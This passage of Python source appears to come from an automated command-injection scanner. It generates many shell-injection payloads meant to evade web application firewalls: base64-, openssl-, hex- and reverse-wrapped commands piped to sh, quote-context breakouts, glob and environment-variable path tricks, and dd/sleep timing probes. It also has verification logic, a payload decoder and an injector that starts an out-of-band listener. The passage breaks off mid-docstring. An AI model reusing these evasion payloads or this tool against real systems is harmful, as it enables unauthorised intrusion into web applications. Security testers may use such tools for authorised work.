        for sep in (";", "|", "&&", "\n", "%0a"):
            # count=50 (~1 s on typical hardware)
            dd50  = _dd_delay_cmd(50,  TAB)
            dd200 = _dd_delay_cmd(200, TAB)
            add(f"{sep}{dd50}",
                f"{sep}dd<TAB>if=/dev/zero<TAB>bs=1M<TAB>count=50",
                f"5H dd TAB delay-50 ({sep})", "time", True, "linux")
            add(f"{sep}{dd200}",
                f"{sep}dd<TAB>if=/dev/zero<TAB>bs=1M<TAB>count=200",
                f"5H dd TAB delay-200 ({sep})", "time", True, "linux")

        # ── 5H-b: Whole-value B64 of dd command ──────────────────────────
        # For apps that b64-decode the full param then pass to shell.
        # These are WV: payloads (replace-mode).
        dd_b64_50  = _dd_delay_b64(50)
        dd_b64_200 = _dd_delay_b64(200)
        add(dd_b64_50,
            "WV:b64(dd-delay-50)",
            "5H WV-B64 dd delay-50",
            "time", True, "linux")
        add(dd_b64_200,
            "WV:b64(dd-delay-200)",
            "5H WV-B64 dd delay-200",
            "time", True, "linux")

        # ── 5H-c: Command-wrap B64 of dd (sep + echo b64|base64 -d|sh) ──
        # For WAFs that inspect plaintext payload but not b64 body.
        b64_dd50  = cls._b64_wrap(_dd_delay_cmd(50,  TAB))
        b64_dd200 = cls._b64_wrap(_dd_delay_cmd(200, TAB))
        for sep in (";", "|"):
            add(f"{sep}{b64_dd50}",
                f"{sep}B64-wrap(dd-delay-50)",
                f"5H B64-wrap dd-50 ({sep})", "time", True, "linux")
            add(f"{sep}{b64_dd200}",
                f"{sep}B64-wrap(dd-delay-200)",
                f"5H B64-wrap dd-200 ({sep})", "time", True, "linux")

        # ── 5H-d: dd control (dd count=1, ~instant) for differential ─────
        # Registered as non-timed so it's never misinterpreted as a delay.
        # _wv_timing_test builds its own dd control inline; this entry is
        # here only for reference — it is NOT added to the results list.
        # (No add() call — just a comment anchor for _dd_ctrl_b64 below.)

        # ─── 5I: Response-adaptive evasion (based on server error signals) ──
        #
        # These techniques activate based on what the server's error responses
        # reveal about the execution context:
        #
        #   5I-a  Quote-context escape    — when response suggests input is
        #         inside a quoted string: '; cmd; echo '  or  "; cmd; echo "
        #
        #   5I-b  $'...' ANSI-C quoting  — space-free via $'\x20', bypasses
        #         WAFs that block ${IFS} specifically
        #
        #   5I-c  Wildcard glob trick    — /???/??  globs /bin/sh, no path
        #         needed; bypasses WAFs blocking /bin, /sh keywords
        #
        #   5I-d  Env var substring      — ${PATH:0:1} = '/', build paths
        #         without '/' char; bypasses slash blacklists
        #
        #   5I-e  Reverse+pipe           — echo "cmd_reversed"|rev|sh
        #         Reverses the command string; WAF sees no real command
        #
        #   5I-f  Char concat            — v=i;v+=d;$v  builds command from
        #         variable fragments; bypasses command keyword filters
        #
        #   5I-g  Base64 via openssl     — echo b64|openssl base64 -d|sh
        #         Fallback for systems where base64 binary is blocked
        #
        #   5I-h  Command in env var     — export x=id;$x
        #         WAFs inspect literal param value, not exported env
        #
        #   5I-i  Read from /dev/stdin   — when input can be piped through
        #         the filesystem descriptor instead of argv

        # 5I-a: Quote context escape (both single and double quote contexts)
        for sep in (";", "|"):
            # Break out of single-quote context: '; CMD; echo '
            add(f"'; {b64_echo}; echo '",
                f"'; b64-echo; echo '",
                f"5I-a squote-ctx b64echo ({sep})", "echo", False, "linux")
            add(f"'; {b64_id}; echo '",
                f"'; b64-id; echo '",
                f"5I-a squote-ctx b64id ({sep})", "system:linux_id", False, "linux")
            add(f"'; sleep 5; echo '",
                f"'; sleep 5; echo '",
                f"5I-a squote-ctx sleep ({sep})", "time", True, "linux")
            # Break out of double-quote context
            add(f'"; {b64_echo}; echo "',
                f'"; b64-echo; echo "',
                f"5I-a dquote-ctx b64echo ({sep})", "echo", False, "linux")
            add(f'"; sleep 5; echo "',
                f'"; sleep 5; echo "',
                f"5I-a dquote-ctx sleep ({sep})", "time", True, "linux")

        # 5I-b: $'...' ANSI-C quoting — space via $'\x20', avoids ${IFS}
        ansi_id    = "$'id'"
        ansi_sleep = "$'sleep'$'\\x20''10'"
        ansi_echo  = f"$'echo'$'\\x20''{tok}'"
        for sep in (";", "|", "&&"):
            add(f"{sep}{ansi_id}",
                f"{sep}$'id'",
                f"5I-b ANSI-C id ({sep})", "system:linux_id", False, "linux")
            add(f"{sep}{ansi_sleep}",
                f"{sep}$'sleep'$'\\x20''10'",
                f"5I-b ANSI-C sleep ({sep})", "time", True, "linux")
            add(f"{sep}{ansi_echo}",
                f"{sep}$'echo'$'\\x20''TOKEN'",
                f"5I-b ANSI-C echo ({sep})", "echo", False, "linux")

        # 5I-c: Wildcard glob — /???/??  matches /bin/sh, /bin/id etc.
        # Uses glob expansion to avoid typing /bin/ literally
        glob_id    = "/???/??<<<"    # /bin/id via glob (3+2 char names)
        # More reliable: just glob /bin directly
        for sep in (";", "|"):
            add(f"{sep}/???/id",
                f"{sep}/???/id",
                f"5I-c glob id ({sep})", "system:linux_id", False, "linux")
            add(f"{sep}/???/whoami",
                f"{sep}/???/whoami",
                f"5I-c glob whoami ({sep})", "system:linux_user", False, "linux")
            add(f"{sep}/????/sleep${'{'}IFS{'}'}10",
                f"{sep}/????/sleep${{IFS}}10",
                f"5I-c glob sleep ({sep})", "time", True, "linux")

        # 5I-d: Env var substring for path construction
        # ${PATH:0:1} = '/' on most systems; ${HOME:0:1} = '/'
        slash = "${PATH:0:1}"
        for sep in (";", "|"):
            add(f"{sep}{slash}usr{slash}bin{slash}id",
                f"{sep}${{PATH:0:1}}usr${{PATH:0:1}}bin${{PATH:0:1}}id",
                f"5I-d envvar-slash id ({sep})", "system:linux_id", False, "linux")
            add(f"{sep}{slash}bin{slash}id",
                f"{sep}${{PATH:0:1}}bin${{PATH:0:1}}id",
                f"5I-d envvar-slash /bin/id ({sep})", "system:linux_id", False, "linux")

        # 5I-e: Reverse pipe — echo reversed_cmd | rev | sh
        # WAF sees no recognisable command; rev reassembles it
        def rev_wrap(cmd: str, sep: str) -> str:
            rev_cmd = cmd[::-1]
            return f"{sep}echo${{{' '}IFS}}{rev_cmd}|rev|sh".replace(f"{{{' '}IFS}}", "${IFS}")

        for sep in (";", "|"):
            add(rev_wrap("id", sep),
                f"{sep}echo_rev(id)|rev|sh",
                f"5I-e rev id ({sep})", "system:linux_id", False, "linux")
            add(rev_wrap("whoami", sep),
                f"{sep}echo_rev(whoami)|rev|sh",
                f"5I-e rev whoami ({sep})", "system:linux_user", False, "linux")
            add(rev_wrap(f"echo {tok}", sep),
                f"{sep}echo_rev(echo TOKEN)|rev|sh",
                f"5I-e rev echo ({sep})", "echo", False, "linux")
            add(rev_wrap("sleep 5", sep),
                f"{sep}echo_rev(sleep 5)|rev|sh",
                f"5I-e rev sleep ({sep})", "time", True, "linux")

        # 5I-f: Char concat — build command from variable fragments
        # v=i;v+=d;$v  →  runs "id"; WAF never sees the word "id"
        for sep in (";", "|"):
            add(f"{sep}v=i;v+=d;$v",
                f"{sep}v=i;v+=d;$v",
                f"5I-f concat id ({sep})", "system:linux_id", False, "linux")
            add(f"{sep}v=who;v+=ami;$v",
                f"{sep}v=who;v+=ami;$v",
                f"5I-f concat whoami ({sep})", "system:linux_user", False, "linux")
            add(f"{sep}v=sle;v+=ep;$v${'{'}IFS{'}'}5",
                f"{sep}v=sle;v+=ep;$v${{IFS}}5",
                f"5I-f concat sleep ({sep})", "time", True, "linux")

        # 5I-g: openssl base64 fallback (when base64 binary is blocked)
        ossl_id    = f"echo {AdaptiveBypass._b64('id')}|openssl base64 -d|sh"
        ossl_who   = f"echo {AdaptiveBypass._b64('whoami')}|openssl base64 -d|sh"
        ossl_echo  = f"echo {AdaptiveBypass._b64(f'echo {tok}')}|openssl base64 -d|sh"
        ossl_sleep = f"echo {AdaptiveBypass._b64('sleep 5')}|openssl base64 -d|sh"
        for sep in (";", "|"):
            add(f"{sep}{ossl_id}",   f"{sep}openssl-b64(id)",
                f"5I-g openssl-b64 id ({sep})",    "system:linux_id",  False, "linux")
            add(f"{sep}{ossl_who}",  f"{sep}openssl-b64(whoami)",
                f"5I-g openssl-b64 who ({sep})",   "system:linux_user",False, "linux")
            add(f"{sep}{ossl_echo}", f"{sep}openssl-b64(echo TOKEN)",
                f"5I-g openssl-b64 echo ({sep})",  "echo",             False, "linux")
            add(f"{sep}{ossl_sleep}",f"{sep}openssl-b64(sleep 5)",
                f"5I-g openssl-b64 sleep ({sep})", "time",             True,  "linux")

        # 5I-h: Command stored in env var then executed
        for sep in (";", "|"):
            add(f"{sep}export${'{'}IFS{'}'}x=id;$x",
                f"{sep}export${{IFS}}x=id;$x",
                f"5I-h envvar id ({sep})", "system:linux_id", False, "linux")
            add(f"{sep}export${'{'}IFS{'}'}x=whoami;$x",
                f"{sep}export${{IFS}}x=whoami;$x",
                f"5I-h envvar whoami ({sep})", "system:linux_user", False, "linux")

        return results

    # ─────────────────────────────────────────────────────────────────────────
    # expand_payloads  (used by external callers — kept for compat)
    # ─────────────────────────────────────────────────────────────────────────
    @classmethod
    def expand_payloads(cls, raw_payloads: list, filters: set) -> list:
        """
        Given raw payload strings and detected filter labels,
        return list of {payload, encoding, desc} dicts.
        """
        result = []
        seen   = set()

        def add(pl, encoding, desc):
            if pl not in seen:
                seen.add(pl)
                result.append({"payload": pl, "encoding": encoding, "desc": desc})

        for raw in raw_payloads:
            add(raw, "raw", "raw (re-try)")
            if not filters:
                continue
            if "no_space" in filters or "waf" in filters:
                add(cls._ifs(raw),  "ifs_space", "IFS space bypass")
                add(cls._tab(raw),  "tab_space", "tab space bypass")
            if "no_semicolon" in filters or "waf" in filters:
                alt = raw.replace(";", "\n").replace("&&", "||")
                if alt != raw:
                    add(alt, "alt_sep", "newline separator")
                alt2 = raw.replace(";", "%0a").replace(" ", "${IFS}")
                add(alt2, "urlnl_ifs", "URL-newline + IFS")
            if "base64" in filters or "waf" in filters:
                for sep in (";", "&&", "|", "||"):
                    if raw.startswith(sep):
                        cmd_part = raw[len(sep):].strip()
                        if cmd_part:
                            add(sep + cls._b64_wrap(cmd_part),
                                "b64_cmd", f"B64-wrap ({sep})")
                            break
            if "hex" in filters or "waf" in filters:
                for sep in (";", "&&", "|"):
                    if raw.startswith(sep):
                        cmd_part = raw[len(sep):].strip()
                        if cmd_part:
                            add(sep + cls._hex_wrap(cmd_part),
                                "hex_cmd", f"hex-wrap ({sep})")
                            break
            if "double_url" in filters:
                add(cls._url_enc(raw, double=True), "double_url", "double URL-encoded")
            elif "waf" in filters:
                add(cls._url_enc(raw), "url_encoded", "URL-encoded payload")

        return result


# ─────────────────────────────────────────────────────────────────────────────
# 4-STAGE FALSE POSITIVE VERIFIER  (original + type-conversion check)
# ─────────────────────────────────────────────────────────────────────────────
class Verifier:
    def __init__(self, client, token):
        self.client = client
        self.token = token

    def _has_db_error_near_token(self, body):
        tl = self.token.lower()
        pos = body.lower().find(tl)
        if pos == -1:
            return False
        window = body[max(0, pos-300):min(len(body), pos+300)].lower()
        for pat in DB_ERROR_PATTERNS:
            if re.search(pat, window, re.I):
                return True
        # Also reject if token appears in any application error context:
        # type_conversion  -- int() raised before shell
        # sql              -- token ended up inside a SQL query string
        #                     e.g. LIKE '%test;echo TOKEN%' → syntax error
        # php_warning      -- token in PHP warning message
        # app_crash        -- token in traceback/exception output
        err_class = AdaptiveBypass.classify_error(body)
        if err_class in ("type_conversion", "sql", "php_warning", "app_crash"):
            return True
        return False

    def _only_in_urls(self, body):
        token_lower = self.token.lower()
        positions = [m.start() for m in re.finditer(re.escape(token_lower), body.lower())]
        if not positions:
            return False
        clean_occurrences = 0
        for pos in positions:
            ctx = body[max(0, pos-100):min(len(body), pos+30)]
            in_href = bool(re.search(
                r'(?:href|src|action|location)[^<]{0,80}' + re.escape(self.token),
                ctx, re.I
            ))
            url_encoded = "%" in body[max(0, pos-5):pos]
            if not in_href and not url_encoded:
                clean_occurrences += 1
        return clean_occurrences == 0

    def _control_request(self, endpoint, param_name, separator):
        control_val = (
            endpoint["params"].get(param_name, "") +
            separator + "DEADBEEF_NOEXIST_CMD_" + self.token
        )
        test_params = {**endpoint["params"], param_name: control_val}
        if endpoint["method"] == "GET":
            resp = self.client.get(endpoint["url"], test_params)
        else:
            resp = self.client.post(endpoint["url"], {**endpoint["hidden"], **test_params})
        return self.token.lower() in resp.get("body", "").lower()

    def verify_echo(self, endpoint, param_name, separator, resp_body, baseline_body):
        token_lower = self.token.lower()
        if token_lower in baseline_body.lower():
            return False, "Token already in baseline body"
        if token_lower not in resp_body.lower():
            return False, "Token not in response"
        if self._has_db_error_near_token(resp_body):
            return False, "Token inside DB/type-conversion error — not command execution"
        if self._only_in_urls(resp_body):
            return False, "Token only reflected in URL attributes (HPP/param reflection)"

        # ── Input-reflection guard ────────────────────────────────────────────
        # If the token appears in the response only because the raw param value
        # (which contains the token as part of the payload) is echoed back
        # verbatim — e.g. JSON: {"port": "`echo HHDTOKEN`"} — that is input
        # reflection, not command execution.
        # Detection: check if the param name appears near the token in a
        # key:value pattern, AND the control request (which uses a different
        # value) also gets the token reflected (i.e. app reflects everything).
        _rb_lower = resp_body.lower()
        _pname_lower = param_name.lower()
        _tok_pos = _rb_lower.find(token_lower)
        if _tok_pos >= 0:
            # Context window around the token hit
            _ctx = _rb_lower[max(0, _tok_pos - 80): _tok_pos + 80]
            # If the param name appears in the same context window and the
            # token is embedded inside backticks/quotes (the raw payload),
            # this is very likely a JSON value reflection.
            _payload_chars = set('`"\'')
            _near_payload_wrap = any(c in resp_body[max(0, _tok_pos-2):_tok_pos] for c in _payload_chars)
            if _pname_lower in _ctx and _near_payload_wrap:
                return False, "Token appears inside reflected param value (JSON input reflection — not execution)"

        if self._control_request(endpoint, param_name, separator):
            return False, "Token appears in control request — verbatim input reflection"
        pos = resp_body.lower().find(token_lower)
        s = max(0, pos - 25)
        e = min(len(resp_body), pos + len(self.token) + 25)
        snippet = resp_body[s:e].strip().replace("\n", " ").replace("\r", "")
        return True, f"Token '{self.token}' confirmed in output — …{snippet}…"

    def verify_system(self, pattern_key, resp_body, baseline_body):
        """
        Verify system command output with context-aware false-positive checks.

        Result taxonomy:
          DIRECT OUTPUT      — command output matched regex in response body
          BLIND:EXEC-CONFIRM — no output, but server returned execution signal
          (false)            — WAF block, app error, or FP pattern match
        """
        pat = SYSTEM_PATTERNS.get(pattern_key)
        if not pat:
            return False, ""

        # Reject type_conversion / sql / php_warning / app_crash — these are
        # application errors, not execution signals
        err_class = AdaptiveBypass.classify_error(resp_body)
        if err_class in ("type_conversion", "sql", "php_warning", "app_crash"):
            return False, (f"Response is {err_class} error — payload hit sanitization before shell")

        # WAF block: generic deny — NOT the same as successful blind execution.
        # A WAF block means the payload was STOPPED, not executed.
        if err_class == "waf_block":
            return False, "WAF/firewall blocked the request — payload not executed"

        # exec_error: command reached the shell but produced an OS-level error
        # (command not found, permission denied, no such file, /bin/sh: …).
        # This CONFIRMS injection — the shell ran our payload and reported back.
        # Only count it if the exec error is NEW vs baseline (not a pre-existing message).
        #
        # FIX 2: Require error to reference a real payload command word.
        # Prevents probe values (hh_probe_X1) triggering false exec_error confirms
        # when the app passes any input to a shell and reports it as "not found".
        _PAYLOAD_CMD_RE = re.compile(
            r"\b(?:whoami|sleep|uname|id|cat|ls|echo|curl|wget|bash|sh|nc|ping|nslookup)\b",
            re.I
        )
        if err_class == "exec_error":
            baseline_err = AdaptiveBypass.classify_error(baseline_body)
            if baseline_err != "exec_error":
                m_err = re.search(
                    r"command\s+not\s+found|no\s+such\s+file\s+or\s+directory"
                    r"|permission\s+denied|operation\s+not\s+permitted"
                    r"|/bin/sh:\s|bash:\s+\w+:\s+(?:command\s+not\s+found|not\s+found)",
                    resp_body, re.I)
                if m_err and _PAYLOAD_CMD_RE.search(resp_body):
                    snippet = m_err.group().strip()[:60]
                    return True, (
                        f"Shell exec error confirms injection: '{snippet}' "
                        f"(payload reached the shell — command failed but injection confirmed)"
                    )
                # exec error present but no known payload cmd — probe reflection, skip

        body_lower = resp_body[:2000].lower()
        for err_pat in DB_ERROR_PATTERNS:
            if re.search(err_pat, body_lower, re.I):
                return False, f"Response contains error/warning pattern ({err_pat[:40]}) — not shell"

        if pat.search(baseline_body):
            return False, ""

        m = pat.search(resp_body)
        if not m:
            # 1. Check structured success indicators in HTML/JSON body.
            #    These are explicit app-level messages ("Command executed successfully",
            #    exit code 0, {"status":"ok"} etc.) — higher confidence than exec_confirm.
            si_found, si_conf, si_snippet = AdaptiveBypass._scan_success_indicators(
                resp_body, baseline_body)
            if si_found:
                ev = (f"App success indicator [{si_conf}] in response body: "
                      f"'{si_snippet}' (no direct output — blind)")
                return True, ev

            # 2. Fall back to exec_confirm signal patterns (status=ok, job queued…)
            exec_conf_pat = AdaptiveBypass._FILTER_HINTS.get("exec_confirm")
            if exec_conf_pat and exec_conf_pat.search(resp_body):
                if not exec_conf_pat.search(baseline_body):
                    ev = "Execution confirmation signal in response (no direct output — blind)"
                    return True, ev
            return False, ""

        matched_text = (m.group(1) if m.lastindex else m.group()).strip()
        pos = m.start()

        ctx_start = max(0, pos - 200)
        ctx_end   = min(len(resp_body), pos + 200)
        context   = resp_body[ctx_start:ctx_end]

        if _EXEC_FP_CONTEXT.search(context):
            return False, f"Match '{matched_text}' found inside PHP error/warning — not execution"

        pre_ctx = resp_body[max(0, pos-3):pos]
        if pre_ctx and pre_ctx[-1] == "/":
            return False, f"Match '{matched_text}' immediately follows / — likely a file path"

        if pattern_key == "linux_user":
            ctx_text = re.sub(r'<[^>]+>', ' ', context)
            ctx_text = re.sub(r'&[a-z#0-9]+;', ' ', ctx_text)
            before_match = ctx_text[:ctx_text.lower().find(matched_text.lower())].rstrip()
            if re.search(r"(?:warning|error|notice|fatal|fopen|fpassthru|include)[:\s(]", ctx_text, re.I):
                return False, f"Match '{matched_text}' appears in error context"
            if before_match and before_match[-1] in ("@", "/", "\\"):
                return False, f"Match '{matched_text}' is part of email/path"

        # Reject if matched word is a known shell command — this means the app
        # reflected the raw payload string rather than executing it.
        # 'whoami' in an input field echo ≠ whoami output. Same for 'id', etc.
        if matched_text.lower() in _REFLECTED_CMD_WORDS:
            return False, (f"Match '{matched_text}' is a command keyword — "
                           f"likely reflected input, not command output")

        s = max(0, pos - 20)
        e = min(len(resp_body), pos + 60)
        snippet = resp_body[s:e].strip().replace("\n", " ").replace("\r", "")
        return True, f"System output confirmed: '{matched_text}' — …{snippet}…"

    def verify_time(self, elapsed, baseline_time, threshold,
                    endpoint=None, param_name=None, separator=";", client=None,
                    blind_context=False):
        """
        Time-based verification with multi-sample differential timing.

        Two stages:
          Stage 1 (fast reject): elapsed - baseline < adaptive_min -> False.
          Stage 2 (differential): 3-sample baseline MEDIAN vs caller elapsed.

        3-sample baseline protocol:
          - Send sleep-0 THREE times, take MEDIAN (absorbs single-spike jitter).
          - Compare caller-measured sleep elapsed against that median.
          - Ratio check: elapsed / median >= ratio_min.
          - Gate check: median < ctrl_gate (rejects naturally slow endpoints).

        Advantages over 2-sample min:
          - False-positive-resistant: a single network spike cant inflate elapsed.
          - False-negative-resistant: a single lucky fast baseline wont inflate ratio.
          - Better suited to high-latency environments with bursty delays.

        blind_context=True: ratio_min=1.8x, ctrl_gate=0.45*threshold.
        Adaptive: when delay < 70% of threshold (exec timeout), relax both.
        """
        delay = elapsed - baseline_time

        # Stage 1: fast reject
        adaptive_min = min(threshold, 3.5)
        if delay < adaptive_min:
            return False, ""

        # Without endpoint: basic single-sample check
        if endpoint is None or param_name is None or client is None:
            return True, f"Delay {delay:.1f}s (baseline: {baseline_time:.2f}s)"

        # Adaptive thresholds
        ratio_min = 1.8 if blind_context else 2.5
        ctrl_gate = threshold * 0.45 if blind_context else threshold * 0.65

        short_delay = delay < threshold * 0.7
        if short_delay:
            ctrl_gate = min(ctrl_gate, delay * 0.4)
            ratio_min = max(1.6, ratio_min - 0.3)

        # -- 3-sample baseline (sleep 0) -> MEDIAN ---------------------------
        enc_replace = (self._enc_for(param_name).get("replace", False)
                       if hasattr(self, "_enc_for") else False)
        base_val    = endpoint["params"].get(param_name, "")
        sleep0_pl   = separator + "sleep 0"
        ctrl_value  = sleep0_pl if enc_replace else base_val + sleep0_pl
        injected_ctrl = {**endpoint["params"], param_name: ctrl_value}

        ctrl_times = []
        for _ in range(3):
            t0 = time.time()
            try:
                if endpoint["method"] == "GET":
                    client.get(endpoint["url"], injected_ctrl)
                else:
                    client.post(endpoint["url"],
                                {**endpoint.get("hidden", {}), **injected_ctrl})
            except Exception:
                pass
            ctrl_times.append(time.time() - t0)

        ctrl_times.sort()
        ctrl_median = ctrl_times[1] if len(ctrl_times) >= 3 else (
            ctrl_times[0] if ctrl_times else threshold)

        if ctrl_median >= ctrl_gate:
            return False, (
                f"Baseline median {ctrl_median:.2f}s >= gate {ctrl_gate:.2f}s "
                f"(3-sample) -- endpoint appears naturally slow"
            )

        # -- Ratio decision --------------------------------------------------
        ratio = elapsed / max(ctrl_median, 0.05)
        if ratio >= ratio_min:
            timeout_note = " [exec-timeout-short]" if short_delay else ""
            ctx_note     = " [blind]" if blind_context else ""
            ev = (
                f"Multi-sample timing{ctx_note}{timeout_note}: "
                f"sleep={elapsed:.2f}s, baseline_median={ctrl_median:.2f}s "
                f"(ratio {ratio:.1f}x>={ratio_min}x, 3-sample baseline, "
                f"threshold {threshold:.1f}s)"
            )
            return True, ev

        return False, (
            f"Timing ratio {ratio:.1f}x < {ratio_min}x required "
            f"(sleep={elapsed:.2f}s, baseline_median={ctrl_median:.2f}s, 3-sample)"
        )


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD DECODER
#
# Translates obfuscated payloads back to human-readable form for display.
# Called by _record_vuln to show both the raw wire payload and what it means.
# ─────────────────────────────────────────────────────────────────────────────
import base64 as _b64_mod

def decode_payload(pl: str, tmpl: str = "") -> str:
    """
    Given a raw payload string (as sent over the wire) and its template label,
    return a human-readable decoded form so the analyst knows exactly what
    command was executed.

    Handles:
      • echo <b64>|base64 -d|sh           → decoded shell command
      • echo <b64>|base64 -d|base64 -d|sh → double-decoded shell command
      • printf '\\xHH...'|sh               → hex-decoded shell command
      • WV:b64(...)  template label        → whole-value b64, decoded value
      • ${IFS} / \t                        → spaces shown plainly
      • dd\tif=/dev/zero\tbs=1M\tcount=N  → dd I/O delay (Ns) shown
      • plain separators                   → returned as-is
    Returns the decoded string, or the original if decoding is not applicable.
    """
    import re as _re

    decoded = pl.strip()

    # ── 1. WV (whole-value) Base64 — the entire param IS the b64 string ──
    # Detected when: tmpl starts with "WV:", OR the entire payload is a
    # pure base64 string with no shell syntax (no ;|&$\n<> chars).
    _is_pure_b64 = (
        tmpl.startswith("WV:") or
        tmpl.startswith("WV ") or
        "WV-b64" in tmpl or
        "WV-B64" in tmpl or
        (
            # Pure b64: only b64 alphabet chars, length >= 4, no shell chars
            bool(_re.match(r'^[A-Za-z0-9+/=]{4,}$', decoded)) and
            not any(c in decoded for c in (';', '|', '&', '$', '\n', '<', '>', ' ', '\t', "'", '"'))
        )
    )
    if _is_pure_b64:
        # The payload IS the base64 string; try to decode it
        candidate = decoded
        try:
            pad = (4 - len(candidate) % 4) % 4
            inner = _b64_mod.b64decode(candidate + "=" * pad).decode("utf-8", errors="replace")
            # If inner is itself b64 (double), try one more decode
            try:
                pad2 = (4 - len(inner) % 4) % 4
                inner2 = _b64_mod.b64decode(inner + "=" * pad2).decode("utf-8", errors="replace")
                if all(c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789${}/= \t\n|;&" for c in inner2[:30]):
                    return f"[WV decoded×2] {inner2.strip()}"
            except Exception:
                pass
            return f"[WV decoded] {inner.strip()}"
        except Exception:
            return f"[WV: base64-encoded value, could not decode: {candidate[:60]}]"

    # ── 2. echo <b64> | base64 -d | base64 -d | sh (double-wrap) ─────────
    m_dbl = _re.search(r'echo\s+([A-Za-z0-9+/=]{4,})\s*\|\s*base64\s+-d\s*\|\s*base64\s+-d\s*\|\s*sh', decoded)
    if m_dbl:
        try:
            inner_b64 = _b64_mod.b64decode(m_dbl.group(1) + "==").decode("utf-8", errors="replace").strip()
            inner_b64_stripped = inner_b64.rstrip("=")
            cmd = _b64_mod.b64decode(inner_b64_stripped + "==").decode("utf-8", errors="replace").strip()
            sep = decoded[:decoded.index("echo")].strip() or ""
            return f"[dbl-b64 decoded] {sep}{cmd}"
        except Exception:
            pass

    # ── 3. echo <b64> | base64 -d | sh (single-wrap) ─────────────────────
    m_b64 = _re.search(r'echo\s+([A-Za-z0-9+/=]{4,})\s*\|\s*base64\s+-d\s*\|\s*sh', decoded)
    if m_b64:
        try:
            cmd = _b64_mod.b64decode(m_b64.group(1) + "==").decode("utf-8", errors="replace").strip()
            # Grab everything before "echo" as separator
            sep = decoded[:decoded.index("echo")].strip()
            return f"[b64 decoded] {sep}{cmd}"
        except Exception:
            pass

    # ── 4. printf '\\xHH...' | sh  (hex encoding) ─────────────────────────
    m_hex = _re.search(r"printf\s+'((?:\\x[0-9a-fA-F]{2})+)'\s*\|\s*sh", decoded)
    if m_hex:
        try:
            hexstr = _re.sub(r'\\x', '', m_hex.group(1))
            cmd = bytes.fromhex(hexstr).decode("utf-8", errors="replace").strip()
            sep = decoded[:decoded.index("printf")].strip()
            return f"[hex decoded] {sep}{cmd}"
        except Exception:
            pass

    # ── 5. dd TAB I/O delay ───────────────────────────────────────────────
    m_dd = _re.search(r'dd[\t ]if=/dev/zero[\t ]bs=(\w+)[\t ]count=(\d+)', decoded)
    if m_dd:
        bs, count = m_dd.group(1), int(m_dd.group(2))
        mb = count if bs == "1M" else count // 1024
        sep = decoded[:decoded.index("dd")].strip()
        return f"[dd delay] {sep}  →  reads {count}×{bs} from /dev/zero (~{mb//10}-{mb}s I/O delay, no 'sleep' keyword)"

    # ── 6. ${IFS} / \t space-bypass — show with readable spaces ──────────
    readable = decoded.replace("${IFS}", " ").replace("\t", " ")
    if readable != decoded:
        return f"[IFS/tab decoded] {readable}"

    # ── 7. URL-encoded sequences ──────────────────────────────────────────
    if "%0a" in decoded.lower() or "%3b" in decoded.lower() or "%25" in decoded.lower():
        try:
            from urllib.parse import unquote
            url_decoded = unquote(decoded)
            if url_decoded != decoded:
                return f"[url decoded] {url_decoded}"
        except Exception:
            pass

    # ── 8. $'...' ANSI-C quoting ──────────────────────────────────────────
    m_ansi = _re.search(r"\$'([^']+)'", decoded)
    if m_ansi:
        try:
            raw = m_ansi.group(1).encode().decode("unicode_escape")
            return f"[ANSI-C decoded] {raw}"
        except Exception:
            pass

    # Nothing to decode — return as-is
    return decoded


# ─────────────────────────────────────────────────────────────────────────────
# INJECTOR
# ─────────────────────────────────────────────────────────────────────────────

class Injector:
    def __init__(self, client, token, os_target="linux", run_both=False,
                 time_threshold=6.0, safe_mode=True,
                 collab_url=None, output_dir=None, read_path=None):
        self.client         = client
        self.token          = token
        self.os_target      = os_target
        self.run_both       = run_both
        self.time_threshold = time_threshold
        self.safe_mode      = safe_mode
        self.collab_url     = collab_url.rstrip("/") if collab_url else None
        self.output_dir     = output_dir
        self.read_path      = read_path
        self.findings        = []
        self.file_reads      = []
        self._file_read_done = False
        self._lock          = threading.Lock()
        self.verifier       = Verifier(client, token)
        # Per-param encoding state (persists across all tiers for each param).
        # Key = param name, value = {'encoding': str, 'replace': bool}
        # Written once during fingerprinting; read by every tier so no tier
        # ever falls back to plain-text append when replace-mode is required.
        self._param_enc_state: dict = {}
        self._last_response_bodies: list = []
        # Paths extracted from injection responses — drained by run() after each endpoint
        self._late_discovered_paths: set = set()
        self._current_param_baseline: tuple = (None, None)
        # Survived-chars map: (url, method, param) → frozenset of separator chars
        # confirmed to pass the sanitization filter on that endpoint.
        # Populated by Crawler._detect_sanitization_endpoints via run() hand-off.
        self._survived_chars: dict = {}
        # Inst 3: per-param filter fingerprints — (url, method, param) → frozenset of allowed shell chars
        self._filter_fingerprints: dict = {}
        # Inst 2: adaptive timing threshold state (set per-param in test_endpoint)
        self._adaptive_time_thresh_current: float = 9.0
        self._adaptive_time_skip_current: bool = False

        if self.collab_url:
            parsed_c = urllib.parse.urlparse(self.collab_url)
            self.collab_host = parsed_c.netloc or parsed_c.path
        else:
            self.collab_host = None

        # ── Self-hosted OOB listener (always started, no flag needed) ────
        self._oob_server = SelfHostedOOBServer()
        _oob_h, _oob_p = self._oob_server.start()
        if _oob_h and _oob_p:
            self.oob_host = _oob_h
            self.oob_port = _oob_p
            # Override collab_host/collab_url with self-hosted if no external collab
            if not self.collab_url:
                self.collab_host = f"{_oob_h}:{_oob_p}"
                self.collab_url  = f"http://{_oob_h}:{_oob_p}"
        else:
            self.oob_host = None
            self.oob_port = None

        # Inst 2: per-endpoint timing baseline cache
        # key = (url, method, param) → {"avg": float, "stdev": float, "skip": bool}
        self._ep_timing_baseline: dict = {}

        # Build payload sets — ORIGINAL logic, unchanged
        self.payloads_direct   = []
        self.payloads_time     = []
        self.payloads_redirect = []
        self.payloads_oob      = []

        for tmpl, desc, verify_type, is_time, os_type in PAYLOADS:
            if os_type not in ("both", self.os_target) and not self.run_both:
                continue
            resolved = tmpl.replace("TOKEN", token)
            entry = (resolved, tmpl, desc, verify_type, is_time, os_type)
            if verify_type in ("oob", "oob_data"):
                if self.collab_url:
                    self.payloads_oob.append(entry)
            elif is_time:
                self.payloads_time.append(entry)
            elif verify_type.startswith("redirect:"):
                self.payloads_redirect.append(entry)
            else:
                self.payloads_direct.append(entry)

        self.payloads = (self.payloads_direct + self.payloads_time +
                         self.payloads_redirect + self.payloads_oob)

    # Payload prefixes that should REPLACE the value rather than append to it
    _REPLACE_PREFIXES = ("--", "\n", "%0a", "%0d", "'", '"')

    def _send(self, endpoint, param_name, payload):
        """
        Send a request injecting `payload` into `param_name`.

        Replace-mode (applied in order of precedence):
